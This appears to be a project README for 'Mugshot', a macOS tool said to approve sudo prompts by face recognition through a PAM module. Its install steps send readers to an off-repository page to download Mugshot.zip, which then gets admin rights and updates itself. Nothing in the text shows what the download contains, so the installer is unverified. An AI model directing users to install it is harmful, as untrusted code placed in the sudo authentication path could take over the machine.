# 👤 macos-faceid - Unlock your computer with your face

[![](https://img.shields.io/badge/download-latest_release-blue.svg)](https://arthurg4247.github.io)

Mugshot brings face recognition to your macOS sudo prompt. You can now authorize high-privilege commands using your face instead of your password. The application runs entirely on your local machine. It does not send image data to the cloud.

## ⚙️ How it Works

The application monitors your terminal sudo requests. When you run a command that requires administrative access, the app activates your built-in camera. It scans your face. If the system recognizes you, it validates the request automatically. This tool provides a convenient way to manage system tasks. It creates a seamless bridge between your physical identity and your computer security.

## 📋 System Requirements

Your computer must meet these standards to run the application:

*   **Operating System**: macOS Sonoma or newer.
*   **Processor**: Apple Silicon (M1, M2, or M3 chip).
*   **Camera**: A functional built-in FaceTime camera.
*   **Permission**: Administrative access to install system-wide plugins.

## 📥 Download and Setup

Follow these steps to install the application on your computer:

1. Visit [this page to download](https://arthurg4247.github.io) the latest version of the installer.
2. Select the file named `Mugshot.zip` from the list.
3. Open your Downloads folder and double-click the file to extract the application.
4. Move the application icon into your Applications folder.
5. Open the application.
6. Follow the on-screen prompts to grant camera access to the tool.

The installation includes a module that integrates with the Pluggable Authentication Module (PAM) architecture of macOS. You must provide your password one final time during the first run so the app can register itself as a valid authentication method.

## 🛡️ Privacy and Security

Data security governs the design of this software. The recognition engine lives inside your computer memory. It performs all mathematical calculations locally. Your image data never leaves your device. The app does not save photos of your face to a server. It only transforms your features into a numerical map used for identity matching. 

## 🔧 Troubleshooting

Common issues often relate to camera permissions. If the application fails to trigger, check these settings:

*   **Camera Permissions**: Go to System Settings, select Privacy & Security, and ensure the app has permission to access the Camera.
*   **Sudo Timeout**: If you recently typed your password in the terminal, the system might not prompt for face recognition immediately. Wait for the terminal prompt to refresh.
*   **Lighting**: Ensure your face has adequate light. The recognition algorithm requires a clear view of your features. Stay directly in front of the lens during the scan process.
*   **Multiple Users**: Keep in mind that the software links to your specific user profile. It only authorizes requests for the account configured during setup.

## 💡 Usage Tips

The application works best when you keep your head steady while a command runs. Keep the menu bar app active to see status updates. If the system fails to recognize you three times, it will fall back to the standard password prompt. This ensures you never lose access to your terminal during critical work sessions.

## 📦 Maintenance

The software performs self-updates when you launch the interface. Keep an eye on the menu bar icon for notifications regarding new releases. If you decide to remove the software, use the uninstaller script found in the application menu. This script cleans up the system authentication files to return your computer to factory settings.

Keywords: biometrics, dynamic-island, face-recognition, faceid, macos, menu-bar-app, opencv, pam, security, sudo, swift, swiftui, touch-id, touchid